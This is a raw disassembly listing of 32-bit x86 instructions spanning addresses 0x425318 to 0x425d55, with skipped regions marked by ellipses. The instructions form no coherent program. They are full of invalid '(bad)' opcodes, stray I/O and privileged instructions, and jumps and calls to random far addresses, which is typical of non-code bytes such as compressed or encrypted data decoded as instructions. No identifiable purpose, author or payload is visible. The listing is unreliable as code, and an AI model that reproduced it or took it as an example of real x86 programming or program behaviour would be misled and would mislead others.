  425318:	fistp  QWORD PTR [edi+0x296a53ab]
  42531e:	jecxz  0x425345
  425320:	imul   ebx,DWORD PTR [ecx+ebp*8+0x7],0xdb9e733f
  425328:	xchg   esi,eax
  425329:	shl    bl,0xc6
  42532c:	icebp  
  42532d:	dec    esi
  42532e:	fs aam 0xdd
  425331:	(bad)  
  425332:	cli    
  425333:	lea    esi,ds:0x91a45d63
  425339:	into   
  42533a:	jmp    0x5e77a75d
  42533f:	imul   edi,DWORD PTR [ecx],0x6a
  425342:	push   eax
  425343:	hlt    
  425344:	shr    DWORD PTR [eax],0xb3
  425347:	pop    esi
  425348:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425349:	pop    ecx
  42534a:	ins    DWORD PTR es:[edi],dx
  42534b:	call   0xc928ef67
  425350:	popa   
  425351:	jg     0x4252d7
  425353:	xchg   esp,esi
  425355:	rol    DWORD PTR [esi],1
  425357:	and    DWORD PTR [esi],0x66
  42535a:	stos   DWORD PTR es:[edi],eax
  42535b:	xor    eax,0x1e43325d
  425360:	aam    0x5d
  425362:	xor    al,BYTE PTR [edx]
  425364:	mov    ds:0x8bdc399b,eax
  425369:	(bad)
  42536c:	xor    al,0x62
  42536e:	jne    0x42532d
  425370:	aaa    
  425371:	cmc    
  425372:	sub    eax,0x5db4983e
  425377:	mov    ch,0xdd
  425379:	xor    edx,ebp
  42537b:	hlt    
  42537c:	add    edi,ecx
  42537e:	(bad)  
  425380:	cmc    
  425381:	mov    ch,0xea
  425383:	stc    
  425384:	xchg   DWORD PTR [ebx-0x56f8e5ab],edx
  42538a:	push   cs
  42538b:	ins    DWORD PTR es:[edi],dx
  42538c:	sub    al,bl
  42538e:	div    BYTE PTR [eax+0x7a]
  425391:	lods   eax,DWORD PTR ds:[esi]
  425392:	inc    eax
  425393:	xchg   edx,eax
  425394:	pop    ss
  425395:	pop    edx
  425396:	add    BYTE PTR [ecx+0x6b],ch
  425399:	hlt    
  42539a:	(bad)  
  42539b:	jecxz  0x425410
  42539d:	in     al,dx
  42539e:	cmp    al,0x81
  4253a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4253a1:	or     al,0xb7
  4253a3:	adc    BYTE PTR [eax],al
  4253a5:	in     eax,0x79
  4253a7:	adc    cl,ch
  4253a9:	jg     0x425410
  4253ab:	dec    esp
  4253ac:	imul   esp,esp,0x16e9ecab
  4253b2:	xchg   ecx,eax
  4253b3:	jae    0x425357
	...
  425415:	add    BYTE PTR [edx+0x9],al
  425418:	les    ebp,FWORD PTR [ecx-0x14901231]
  42541e:	out    0xf4,eax
  425420:	xchg   al,bl
  425422:	cmp    al,BYTE PTR fs:[ecx+0x18cfc20]
  425429:	add    BYTE PTR [edi],al
  42542b:	add    DWORD PTR [eax],eax
  42542d:	add    BYTE PTR [ebx-0x7b],dl
  425430:	jb     0x4254a9
  425432:	dec    esp
  425433:	push   ecx
  425434:	pop    ebx
  425435:	jl     0x425499
  425437:	jge    0x4253f4
  425439:	push   0x97f7df1
  42543e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42543f:	fnstsw WORD PTR [ecx+ecx*4]
  425442:	in     eax,dx
  425443:	call   0xfade:0x2ffac5dd
  42544a:	lea    esi,[ecx+0x6e882bf4]
  425450:	shr    edi,cl
  425452:	sub    eax,0xd96f12b0
  425457:	sub    DWORD PTR [ecx-0x63],esi
  42545a:	(bad)  
  42545b:	push   ss
  42545c:	xor    BYTE PTR [edi+0x9],0x1e
  425460:	dec    esp
  425461:	pop    eax
  425462:	push   ds
  425463:	sti    
  425464:	sahf   
  425465:	retf   
  425466:	fdivr  DWORD PTR [ebx]
  425468:	cmp    ch,BYTE PTR [eax+0x60]
  42546b:	je     0x4253f4
  42546d:	jbe    0x4254dc
  42546f:	cs push ecx
  425471:	bound  esp,QWORD PTR [ebp-0x57c5bcee]
  425477:	sti    
  425478:	adc    al,0x9c
  42547a:	stos   BYTE PTR es:[edi],al
  42547b:	call   0xe5c7becd
  425480:	in     eax,dx
  425481:	fmul   st(6),st
  425483:	jb     0x425504
  425485:	push   esi
  425486:	pusha  
  425487:	push   edx
  425488:	retf   0xbacc
  42548b:	mov    ds:0x2a534f6,al
  425490:	xchg   ebx,eax
  425491:	shr    DWORD PTR [ebx+0x2d22c987],1
  425497:	jg     0x425487
  425499:	xor    eax,0xa686ec71
  42549e:	hlt    
  42549f:	pop    esp
  4254a0:	popa   
  4254a1:	cmp    eax,0xf428459d
  4254a6:	adc    al,0x55
  4254a8:	loop   0x4254a5
  4254aa:	fimul  DWORD PTR [edx]
  4254ac:	push   ecx
  4254ad:	and    eax,0x241ed95b
  4254b2:	pop    es
  4254b3:	push   edx
  4254b4:	adc    ah,BYTE PTR [ecx]
  4254b6:	out    dx,eax
  4254b7:	outs   dx,DWORD PTR ds:[esi]
  4254b8:	ret    0x12c5
  4254bb:	xor    edx,DWORD PTR [edi-0x35]
  4254be:	lods   al,BYTE PTR ds:[esi]
  4254bf:	in     al,0xe8
  4254c1:	add    DWORD PTR [ebx],ebp
  4254c3:	sbb    al,0x1b
  4254c5:	jle    0x425493
  4254c7:	(bad)  
  4254c8:	in     eax,0xda
  4254ca:	in     al,0x94
  4254cc:	jbe    0x425533
  4254ce:	add    edi,DWORD PTR [edx-0x630fd145]
  4254d4:	je     0x4254fd
  4254d6:	mov    ecx,0x8ce007
  4254db:	call   0xc0c5:0x8cb0b8e9
  4254e2:	sar    DWORD PTR [eax+0x2e7febd],0x42
  4254e9:	or     cl,ch
  4254eb:	aam    0x5e
  4254ed:	adc    eax,0x8550dbfc
  4254f2:	bound  ebx,QWORD PTR [eax]
  4254f4:	mov    BYTE PTR [edi],ch
  4254f6:	jle    0x425525
  4254f8:	lods   al,BYTE PTR ds:[esi]
  4254f9:	jnp    0x4254bc
  4254fb:	sub    al,0x3b
  4254fd:	lock nop
  4254ff:	cmp    eax,0x146ce749
  425504:	push   0x0
  425506:	data16 lock into 
  425509:	mov    edi,0xac6b963e
  42550e:	xchg   ebp,eax
  42550f:	adc    BYTE PTR [ecx+0x4c],dh
  425512:	lods   eax,DWORD PTR ds:[esi]
  425513:	and    eax,0x400a5fca
  425518:	aam    0xe4
  42551a:	pop    esp
  42551b:	mov    bl,0xc5
  42551d:	sub    eax,0xcd2a1709
  425522:	cmp    al,0xf6
  425524:	adc    al,0xbd
  425526:	mov    cl,0x28
  425528:	mov    eax,0x52e64d2c
  42552d:	idiv   BYTE PTR [ebp-0x5d]
  425530:	inc    ebx
  425531:	(bad)
	...
  425596:	(bad)  
  425597:	jmp    0xfef4:0xfe6e7a4e
  42559e:	dec    esp
  42559f:	push   ecx
  4255a0:	ret    0x31c6
  4255a3:	inc    edi
  4255a4:	jp     0x42560f
  4255a6:	add    ecx,DWORD PTR [esi+0x1070001]
  4255ac:	add    BYTE PTR [eax],al
  4255ae:	jmp    0x4255bf
  4255b0:	in     eax,0xbc
  4255b2:	adc    esi,DWORD PTR [esi+esi*4+0x6d937b6]
  4255b9:	pop    esi
  4255ba:	mov    esp,0xf40b5026
  4255bf:	imul   edx
  4255c1:	ret    
  4255c2:	lea    edi,[ecx-0x5d]
  4255c5:	in     al,dx
  4255c6:	adc    ch,BYTE PTR [edi*8-0x7c37ec51]
  4255cd:	cmp    ch,BYTE PTR [edi+0x615e7611]
  4255d3:	ins    DWORD PTR es:[edi],dx
  4255d4:	jne    0x42562a
  4255d6:	outs   dx,BYTE PTR ds:[esi]
  4255d7:	or     DWORD PTR [ebx-0x337e8a9f],eax
  4255dd:	jl     0x42563f
  4255df:	icebp  
  4255e0:	fimul  DWORD PTR [ecx+0x27]
  4255e3:	xor    eax,0x3a3f5aad
  4255e8:	clc    
  4255e9:	sti    
  4255ea:	test   DWORD PTR [eax+0x65a0745b],edi
  4255f0:	jnp    0x425572
  4255f2:	cmp    DWORD PTR [ebp+0x26],edx
  4255f5:	pop    ebx
  4255f6:	push   edi
  4255f7:	add    BYTE PTR [eax+0x57b2d7c8],cl
  4255fd:	mov    ds:0xd5a0a0bd,al
  425602:	adc    bl,al
  425604:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425605:	jo     0x4255b0
  425607:	test   al,0x2
  425609:	mov    esp,ebx
  42560b:	inc    esp
  42560c:	ret    0x8b1
  42560f:	xor    BYTE PTR [ecx+0x2c],ah
  425612:	mov    DWORD PTR [ebp-0x48],esi
  425615:	mul    ebx
  425617:	adc    edx,ebx
  425619:	xor    DWORD PTR [ecx-0x16],esi
  42561c:	sbb    cl,BYTE PTR [ebx-0x5bbfeb0e]
  425622:	sub    ah,ch
  425624:	jno    0x4255df
  425626:	cli    
  425627:	stos   BYTE PTR es:[edi],al
  425628:	mov    ecx,0xcb7250f8
  42562d:	adc    al,0x83
  42562f:	int    0xbf
  425631:	test   al,0x2d
  425633:	es sub al,0xda
  425637:	mov    bl,ah
  425639:	in     eax,dx
  42563a:	sahf   
  42563b:	ffreep st(6)
  42563d:	daa    
  42563e:	xor    DWORD PTR [edi+0x37],eax
  425641:	dec    ecx
  425642:	mov    ecx,0xcd110fa9
  425647:	push   ds
  425648:	mov    esp,0xf71665ed
  42564d:	mov    esi,0xbc02a208
  425652:	and    dl,BYTE PTR [ebx+0x1c23e86c]
  425658:	scas   eax,DWORD PTR es:[edi]
  425659:	stos   DWORD PTR es:[edi],eax
  42565a:	shl    DWORD PTR [eax],cl
  42565c:	bound  ebp,QWORD PTR [edi+edx*1]
  42565f:	sbb    esi,DWORD PTR [edi+0x2b]
  425662:	or     al,0x5e
  425664:	sahf   
  425665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425666:	sahf   
  425667:	jnp    0x4256a1
  425669:	dec    eax
  42566a:	pop    ebp
  42566b:	in     eax,0x8e
  42566d:	dec    ecx
  42566e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42566f:	ror    BYTE PTR [ebx+eiz*1-0x4b03c2f],0x10
  425677:	lea    ebp,gs:[edx]
  42567a:	mov    ch,0x64
  42567c:	inc    eax
  42567d:	call   0xe79f5565
  425682:	pop    eax
  425683:	sbb    al,0x4
  425685:	adc    DWORD PTR [esi+0x1f6df3e8],edx
  42568b:	inc    ecx
  42568c:	xchg   edi,eax
  42568d:	shr    esp,0xbc
  425690:	dec    ebx
  425691:	dec    edx
  425692:	add    bl,dh
  425694:	(bad)
  425699:	shl    BYTE PTR [ebx+0x3e],cl
  42569c:	fs sub edx,eax
  42569f:	aaa    
  4256a0:	adc    bh,BYTE PTR [ecx+0x5a]
  4256a3:	fucomip st,st(1)
  4256a5:	retf   
  4256a6:	adc    eax,0xa695bb
  4256ab:	jb     0x4256bf
  4256ad:	test   bl,ch
  4256af:	push   esp
  4256b0:	les    edx,FWORD PTR [edi+0xe1dacd]
	...
  425716:	(bad)  
  425717:	aaa    
  425718:	shl    BYTE PTR [ebx+esi*8],cl
  42571b:	cmc    
  42571c:	div    bh
  42571e:	mov    dl,0x28
  425720:	shr    DWORD PTR [ebx+0x190fab5f],cl
  425726:	or     cl,BYTE PTR [edi+0x1070001]
  42572c:	add    BYTE PTR [eax],al
  42572e:	cwde   
  42572f:	mov    ds:0x3a052c0f,al
  425734:	add    BYTE PTR [eax],bh
  425736:	ins    DWORD PTR es:[edi],dx
  425737:	fs pop es
  425739:	mov    dl,0xe2
  42573b:	xchg   edx,eax
  42573c:	mov    al,0x4b
  42573e:	mov    BYTE PTR [ebp+0x27],ah
  425741:	and    DWORD PTR [eax-0x15274fb1],ebx
  425747:	mov    esp,0xd7182f11
  42574c:	rcl    BYTE PTR [esp+ecx*1],cl
  42574f:	cmp    DWORD PTR [eax+0x70],0x5e0e85bb
  425756:	jb     0x425704
  425758:	and    eax,0xedc3c1f5
  42575d:	out    dx,al
  42575e:	add    al,0x6d
  425760:	cmp    eax,0xbdb3858d
  425765:	jo     0x425728
  425767:	push   ss
  425768:	mov    esp,0xfe15ce5c
  42576d:	cli    
  42576e:	stos   DWORD PTR es:[edi],eax
  42576f:	or     bl,BYTE PTR [ecx-0x75]
  425772:	int    0x48
  425774:	loope  0x425793
  425776:	mov    ds:0x45ba27e0,eax
  42577b:	cmp    BYTE PTR [edi-0x4e05fed0],bh
  425781:	aas    
  425782:	cdq    
  425783:	jb     0x425781
  425785:	fld    QWORD PTR [ebx-0x39402c74]
  42578b:	mov    WORD PTR [edi],fs
  42578d:	pop    ecx
  42578e:	inc    esp
  42578f:	cmp    edi,edi
  425791:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425792:	shl    BYTE PTR [edx],1
  425794:	xchg   edx,eax
  425795:	retf   0xc6c4
  425798:	retf   
  425799:	and    DWORD PTR [ebp-0x18],edi
  42579c:	push   0xffffffdd
  42579e:	mov    BYTE PTR [eax-0x4],0xcf
  4257a2:	add    al,0xd7
  4257a4:	arpl   di,bp
  4257a6:	test   BYTE PTR [ebx-0x5f],bl
  4257a9:	int    0xe
  4257ab:	mov    bl,0x4a
  4257ad:	push   ecx
  4257ae:	push   esp
  4257af:	sub    eax,0xa39c0e22
  4257b4:	ret    
  4257b5:	test   edx,edx
  4257b7:	les    edi,FWORD PTR [esi-0x6fe84b40]
  4257bd:	jmp    0x332159c
  4257c2:	cmp    al,0x4
  4257c4:	mov    bh,0x88
  4257c6:	test   eax,0x6f9de0dd
  4257cb:	je     0x425785
  4257cd:	loopne 0x4257f5
  4257cf:	test   BYTE PTR [edx],dh
  4257d1:	ja     0x4257e5
  4257d3:	les    edi,FWORD PTR [eax+0x313f3681]
  4257d9:	adc    DWORD PTR [ecx],eax
  4257db:	mov    al,dl
  4257dd:	fistp  QWORD PTR [eax]
  4257df:	and    ch,BYTE PTR [ebp-0x3125be70]
  4257e5:	(bad)  
  4257e7:	repnz or BYTE PTR [esi],cl
  4257ea:	ficom  WORD PTR [ecx-0x4d]
  4257ed:	or     eax,ebx
  4257ef:	sti    
  4257f0:	not    ch
  4257f2:	loop   0x42582a
  4257f4:	xchg   edi,eax
  4257f5:	test   bl,dl
  4257f7:	lock xchg esi,eax
  4257f9:	adc    BYTE PTR ds:0xf5d8ee04,cl
  4257ff:	pusha  
  425800:	cmp    BYTE PTR [esi+0x49],dl
  425803:	enter  0xf874,0x1c
  425807:	adc    eax,0xfe1f5398
  42580c:	cmp    esp,DWORD PTR [ecx]
  42580e:	cmp    edi,esp
  425810:	sbb    cl,cl
  425812:	out    dx,al
  425813:	sbb    edi,edi
  425815:	mov    esp,ebx
  425817:	(bad)  
  425818:	cmp    ebp,DWORD PTR [edi-0x3a]
  42581b:	jg     0x425858
  42581d:	cdq    
  42581e:	mov    esp,0xcfa0233e
  425823:	sbb    eax,0x4e780523
  425828:	sti    
  425829:	aas    
  42582a:	std    
  42582b:	in     al,0x26
  42582d:	cmp    eax,0xcc76ba3
  425832:	test   eax,0xc9cd
	...
  425893:	add    BYTE PTR [eax],al
  425895:	add    BYTE PTR [edx+edx*2-0x70],bl
  425899:	push   edx
  42589a:	sahf   
  42589b:	rcr    dh,cl
  42589d:	pop    esi
  42589e:	inc    eax
  42589f:	scas   eax,DWORD PTR es:[edi]
  4258a0:	stc    
  4258a1:	mov    ds:0xfb8b6bd5,al
  4258a6:	adc    DWORD PTR [eax+0x1070001],edx
  4258ac:	add    BYTE PTR [eax],al
  4258ae:	jne    0x425842
  4258b0:	mov    ecx,0xcd592800
  4258b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4258b6:	mov    ds:0xcd4f8cb,eax
  4258bb:	fistp  WORD PTR [ebp+ecx*1+0x22674026]
  4258c2:	mov    WORD PTR [ebp+0x3f],es
  4258c5:	std    
  4258c6:	imul   esp,DWORD PTR [ebx-0x159986d9],0x1a
  4258cd:	ret    0xf0f5
  4258d0:	data16 jp 0x42587f
  4258d3:	leave  
  4258d4:	xor    DWORD PTR [ebp*2-0xc6abc10],ebp
  4258db:	fisubr WORD PTR [edx+0x153bc904]
  4258e1:	(bad)  
  4258e2:	test   eax,0x59e81b22
  4258e7:	rcl    BYTE PTR ds:0xb339305f,0x0
  4258ee:	icebp  
  4258ef:	hlt    
  4258f0:	mov    al,ds:0x87698ee5
  4258f5:	pop    edi
  4258f6:	test   dh,dh
  4258f8:	lods   al,BYTE PTR ds:[esi]
  4258f9:	cld    
  4258fa:	lds    ecx,FWORD PTR [edx+ecx*1]
  4258fd:	fisttp DWORD PTR [ebx+0x39a19dfb]
  425903:	int3   
  425904:	sub    bh,BYTE PTR [esi]
  425906:	neg    ecx
  425908:	pop    ds
  425909:	sub    DWORD PTR [edi],0x6a
  42590c:	inc    ecx
  42590d:	mov    es,ecx
  42590f:	repnz ror al,1
  425912:	sub    DWORD PTR [ebp+0x14],0xffffffa7
  425916:	(bad)  
  425917:	repz add al,0xe0
  42591a:	xor    al,BYTE PTR [esi+0x1e6dc61a]
  425920:	pusha  
  425921:	inc    edi
  425922:	sbb    al,0xa3
  425924:	aas    
  425925:	sub    ebp,DWORD PTR [edi+0x5a]
  425928:	xor    BYTE PTR [ecx+0x56f7f139],al
  42592e:	sahf   
  42592f:	pop    edi
  425930:	(bad)  
  425932:	cmp    DWORD PTR [ecx+0x1713962d],edx
  425938:	sbb    eax,0x21eb0e6b
  42593d:	lds    esi,FWORD PTR [ecx]
  42593f:	or     al,0xf7
  425941:	xchg   dh,dh
  425943:	jp     0x4258d5
  425945:	and    bh,bl
  425947:	xor    al,0xbf
  425949:	arpl   WORD PTR ds:0x5ed3b8b5,cx
  42594f:	push   eax
  425950:	add    bh,BYTE PTR [esi-0x74]
  425953:	xchg   esp,eax
  425954:	sbb    bl,BYTE PTR [ecx-0x32b5fc12]
  42595a:	das    
  42595b:	lods   al,BYTE PTR ds:[esi]
  42595c:	retf   0xc9d3
  42595f:	mov    bl,0x54
  425961:	add    bl,dl
  425963:	mov    bl,bl
  425965:	cmp    DWORD PTR [ebx-0xf04e4e8],ecx
  42596b:	bound  eax,QWORD PTR [ebx+0x45bfafd5]
  425971:	pop    ds
  425972:	xchg   ebp,eax
  425973:	out    0x5f,eax
  425975:	push   DWORD PTR [esi-0x73751643]
  42597b:	xchg   edi,eax
  42597c:	and    dl,BYTE PTR [edi-0x6908034]
  425982:	ror    DWORD PTR [esi-0x478d6225],1
  425988:	in     eax,0x53
  42598a:	xor    al,dl
  42598c:	mov    dh,0x7c
  42598e:	mov    cl,0x9b
  425990:	ja     0x42598f
  425992:	xchg   ebx,eax
  425993:	in     eax,dx
  425994:	add    DWORD PTR [edx+0x6e126821],edi
  42599a:	out    0x44,al
  42599c:	fstp   QWORD PTR [ecx]
  42599e:	bound  eax,QWORD PTR [ebp+0x23]
  4259a1:	scas   eax,DWORD PTR es:[edi]
  4259a2:	retf   
  4259a3:	push   esi
  4259a4:	loop   0x425934
  4259a6:	gs mov al,0x55
  4259a9:	cmp    BYTE PTR [ebp-0x63],cl
  4259ac:	in     eax,0x6f
  4259ae:	ins    BYTE PTR es:[edi],dx
  4259af:	test   ebx,ebp
  4259b1:	pop    es
  4259b2:	aam    0xa9
  4259b4:	fadd   DWORD PTR [eax]
	...
  425a16:	shl    DWORD PTR [ebx+0x4],0x67
  425a1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a1b:	jcxz   0x425a05
  425a1e:	mov    edi,0x58fbfe11
  425a24:	ins    DWORD PTR es:[edi],dx
  425a25:	add    ebx,DWORD PTR [eax]
  425a27:	xchg   ecx,eax
  425a28:	add    DWORD PTR [eax],eax
  425a2a:	pop    es
  425a2b:	add    DWORD PTR [eax],eax
  425a2d:	add    BYTE PTR [edx+0x2a5e8142],dl
  425a33:	stos   BYTE PTR es:[edi],al
  425a34:	pop    edx
  425a35:	imul   eax,esp,0x6b
  425a38:	adc    al,0xb3
  425a3a:	iret   
  425a3b:	adc    DWORD PTR [edi+edx*4+0x7db4ee28],ebp
  425a42:	mov    eax,0xc0f8263c
  425a47:	int    0x50
  425a49:	pop    es
  425a4a:	jnp    0x425a5d
  425a4c:	cmp    DWORD PTR [edx-0x2d],ebp
  425a4f:	dec    ecx
  425a50:	leave  
  425a51:	fbstp  TBYTE PTR [edx-0x532f8f7d]
  425a57:	loop   0x425a8c
  425a59:	mov    eax,ds:0x3ca5cc7c
  425a5e:	out    dx,eax
  425a5f:	loopne 0x425a39
  425a61:	push   edi
  425a62:	lahf   
  425a63:	loop   0x425a7f
  425a65:	mov    DWORD PTR [esp+ebx*4+0x7e],esi
  425a69:	xor    DWORD PTR [ebp+0x48],edx
  425a6c:	sbb    al,0x14
  425a6e:	mov    bh,0xcf
  425a70:	sbb    ch,dh
  425a72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a73:	repnz sbb al,0x50
  425a76:	imul   ecx,ebx,0x1621c7b8
  425a7c:	push   ebp
  425a7d:	es push cs
  425a7f:	cmp    DWORD PTR [edx],esp
  425a81:	mov    ch,0x9e
  425a83:	sbb    DWORD PTR [eax-0x4d443bdd],eax
  425a89:	or     DWORD PTR [edi],esp
  425a8b:	lahf   
  425a8c:	and    eax,0xddd0c322
  425a91:	pop    edx
  425a92:	push   ecx
  425a93:	sbb    al,0x2a
  425a95:	dec    edi
  425a96:	lahf   
  425a97:	lea    eax,[ebx]
  425a99:	fld    TBYTE PTR [ecx-0x2d09a9e6]
  425a9f:	repz inc esi
  425aa1:	xchg   esp,eax
  425aa2:	lock (bad) 
  425aa4:	jae    0x425a67
  425aa6:	cmp    al,0x62
  425aa8:	out    0x7e,eax
  425aaa:	call   0xb46e3576
  425aaf:	fs xchg esi,eax
  425ab1:	xchg   ebp,eax
  425ab2:	loope  0x425b19
  425ab4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ab5:	pop    ecx
  425ab6:	jnp    0x425afc
  425ab8:	mov    bl,0x84
  425aba:	xchg   edi,eax
  425abb:	test   eax,0x12ae1174
  425ac0:	push   edi
  425ac1:	pop    edx
  425ac2:	aas    
  425ac3:	jo     0x425a8b
  425ac5:	arpl   WORD PTR ds:[esi-0x10481c22],si
  425acc:	and    al,0x9d
  425ace:	aad    0x82
  425ad0:	ins    DWORD PTR es:[edi],dx
  425ad1:	jae    0x425aab
  425ad3:	push   esi
  425ad4:	lods   al,BYTE PTR ds:[esi]
  425ad5:	xchg   BYTE PTR [ebp-0x5e],bh
  425ad8:	in     eax,dx
  425ad9:	pop    edi
  425ada:	repz sbb BYTE PTR [esi-0x52],al
  425ade:	jmp    0x91d5:0x2f693436
  425ae5:	mov    dl,0x98
  425ae7:	jo     0x425b1c
  425ae9:	mov    WORD PTR [esp+esi*1-0x23],fs
  425aed:	mov    dl,0x90
  425aef:	adc    dl,ch
  425af1:	ins    BYTE PTR es:[edi],dx
  425af2:	sbb    BYTE PTR [eax+0x440b2410],cl
  425af8:	jge    0x425ad8
  425afa:	adc    al,0xe0
  425afc:	push   edi
  425afd:	add    eax,0xba28eef7
  425b02:	std    
  425b03:	mov    eax,0x97c98d62
  425b08:	repnz outs dx,DWORD PTR ds:[esi]
  425b0a:	ret    0x45c6
  425b0d:	sub    esp,DWORD PTR [esi]
  425b0f:	(bad)  
  425b10:	and    DWORD PTR [ebp-0x2d15770a],esp
  425b16:	aam    0xc8
  425b18:	dec    eax
  425b19:	in     eax,0xb8
  425b1b:	xchg   ecx,eax
  425b1c:	jno    0x425af6
  425b1e:	pop    edi
  425b1f:	push   esp
  425b20:	xchg   BYTE PTR [eax+0x5b],bh
  425b23:	mov    al,ds:0x544add45
  425b28:	ror    edx,cl
  425b2a:	imul   esi,DWORD PTR [ebp+0x6985ea30],0xffffffd7
  425b31:	and    dl,BYTE PTR [edi]
  425b33:	idiv   BYTE PTR [ecx]
	...
  425b95:	add    ah,al
  425b97:	clc    
  425b98:	jnp    0x425bf0
  425b9a:	jg     0x425b73
  425b9c:	in     eax,dx
  425b9d:	cli    
  425b9e:	push   0x33a5aad3
  425ba3:	out    0xe6,al
  425ba5:	(bad)  
  425ba6:	pop    ds
  425ba7:	xchg   edx,eax
  425ba8:	add    DWORD PTR [eax],eax
  425baa:	pop    es
  425bab:	add    DWORD PTR [eax],eax
  425bad:	add    BYTE PTR [ecx],al
  425baf:	dec    ebp
  425bb0:	adc    BYTE PTR [edx-0x1a9ac9f9],ah
  425bb6:	lahf   
  425bb7:	cld    
  425bb8:	pop    esi
  425bb9:	cwde   
  425bba:	mov    ds:0x8c9a6f36,al
  425bbf:	cli    
  425bc0:	neg    cl
  425bc2:	jbe    0x425ba3
  425bc4:	neg    DWORD PTR [edi-0x7b22dd29]
  425bca:	loopne 0x425b8a
  425bcc:	pop    esp
  425bcd:	xor    eax,0xbcc93ba6
  425bd2:	push   esi
  425bd3:	adc    BYTE PTR [edi-0x1df323a0],0xb0
  425bda:	outs   dx,BYTE PTR ds:[esi]
  425bdb:	mov    ds:0x7c49815a,al
  425be0:	inc    ebx
  425be1:	add    bh,al
  425be3:	sub    esp,DWORD PTR [edi+0x7c]
  425be6:	adc    dl,BYTE PTR [edx+0x71]
  425be9:	inc    esp
  425bea:	add    esi,DWORD PTR [esi-0x3f]
  425bed:	sbb    DWORD PTR [esi],esi
  425bef:	loope  0x425c23
  425bf1:	adc    edi,DWORD PTR [esi]
  425bf3:	inc    ebp
  425bf4:	push   edx
  425bf5:	(bad)  
  425bf6:	leave  
  425bf7:	sbb    bl,BYTE PTR [esi]
  425bf9:	mov    al,0x81
  425bfb:	pop    esp
  425bfc:	pusha  
  425bfd:	ror    edi,0x8d
  425c00:	das    
  425c01:	xchg   ecx,eax
  425c02:	std    
  425c03:	sub    ecx,DWORD PTR [ebp+0x43244feb]
  425c09:	push   esp
  425c0a:	pop    ebx
  425c0b:	xor    esp,esp
  425c0d:	scas   al,BYTE PTR es:[edi]
  425c0e:	lods   eax,DWORD PTR ds:[esi]
  425c0f:	fwait
  425c10:	mov    al,0xeb
  425c12:	lahf   
  425c13:	cdq    
  425c14:	adc    ebp,ebx
  425c16:	shl    BYTE PTR [ecx+0x5be4abd1],1
  425c1c:	loopne 0x425c12
  425c1e:	test   BYTE PTR fs:[eax-0x5c],ah
  425c22:	das    
  425c23:	arpl   WORD PTR [edx-0x3a1f922],ax
  425c29:	inc    ebx
  425c2a:	stc    
  425c2b:	xchg   ebp,eax
  425c2c:	lahf   
  425c2d:	inc    ecx
  425c2e:	scas   eax,DWORD PTR es:[edi]
  425c2f:	fld    DWORD PTR [edi]
  425c31:	mov    eax,ds:0x95d84e04
  425c36:	sbb    esi,ecx
  425c38:	dec    edi
  425c39:	gs stos DWORD PTR es:[edi],eax
  425c3b:	xor    DWORD PTR ds:0xe2229757,esi
  425c41:	sub    edi,ebx
  425c43:	cld    
  425c44:	scas   al,BYTE PTR es:[edi]
  425c45:	lahf   
  425c46:	ins    DWORD PTR es:[edi],dx
  425c47:	mov    ah,0x83
  425c49:	inc    edx
  425c4a:	jmp    0xcf6c:0xe85e0bc6
  425c51:	retf   
  425c52:	mov    bh,0x3d
  425c54:	sahf   
  425c55:	sbb    BYTE PTR [ecx+ebx*2],ah
  425c58:	ins    DWORD PTR es:[edi],dx
  425c59:	lds    esi,FWORD PTR [esi-0x2dd0d5fc]
  425c5f:	gs cld 
  425c61:	out    dx,eax
  425c62:	mov    ebx,0xa1004db5
  425c67:	out    dx,al
  425c68:	fcomp  QWORD PTR [edi]
  425c6a:	jl     0x425c21
  425c6c:	js     0x425ca9
  425c6e:	stc    
  425c6f:	mov    ch,0x91
  425c71:	pop    ebp
  425c72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c73:	ror    edi,1
  425c75:	inc    ecx
  425c76:	inc    esp
  425c77:	fistp  WORD PTR [ecx]
  425c79:	fsubr  st(2),st
  425c7b:	or     cl,BYTE PTR [ebx+0x57]
  425c7e:	dec    edi
  425c7f:	cmovnp edi,DWORD PTR [edi]
  425c82:	imul   esi,DWORD PTR [edx-0x6bd511ad],0x7f
  425c89:	lock jecxz 0x425ce7
  425c8c:	dec    ebp
  425c8d:	(bad)  
  425c8f:	or     DWORD PTR [edx+ebx*1+0x5],edi
  425c93:	and    BYTE PTR ss:[edi-0x1e],0x2e
  425c98:	cmp    dl,dh
  425c9a:	loop   0x425c57
  425c9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c9d:	add    ebx,0x72197130
  425ca3:	jl     0x425c40
  425ca5:	xor    al,0xac
  425ca7:	outs   dx,DWORD PTR ds:[esi]
  425ca8:	(bad)  
  425ca9:	fnstcw WORD PTR [edi+ebx*8]
  425cac:	mov    ebx,0xc5f84e74
  425cb1:	dec    edi
  425cb2:	push   0xa7f4
	...
  425d13:	add    BYTE PTR [eax],al
  425d15:	add    bh,bh
  425d17:	lods   al,BYTE PTR ds:[esi]
  425d18:	fadd   QWORD PTR [edi]
  425d1a:	fbstp  TBYTE PTR [edi-0x1]
  425d1d:	cld    
  425d1e:	fidiv  DWORD PTR [esi+0xd]
  425d21:	in     al,0xec
  425d23:	mov    ds:0x9326fcca,eax
  425d28:	add    DWORD PTR [eax],eax
  425d2a:	pop    es
  425d2b:	add    DWORD PTR [eax],eax
  425d2d:	add    BYTE PTR [eax-0x8],cl
  425d30:	jg     0x425da6
  425d32:	in     al,0x9b
  425d34:	into   
  425d35:	fcom   DWORD PTR ds:0xebd9fc26
  425d3b:	and    eax,0x95033858
  425d40:	repnz loope 0x425d7d
  425d43:	add    DWORD PTR [esi+0x22],ebx
  425d46:	retf   0xe5a6
  425d49:	cwde   
  425d4a:	jb     0x425dc8
  425d4c:	aam    0x20
  425d4e:	inc    eax
  425d4f:	cdq    
  425d50:	sbb    DWORD PTR [ebx-0x7d],edx
  425d53:	mov    ah,0xbf
  425d55:	ins    BYTE PTR es:[edi],dx
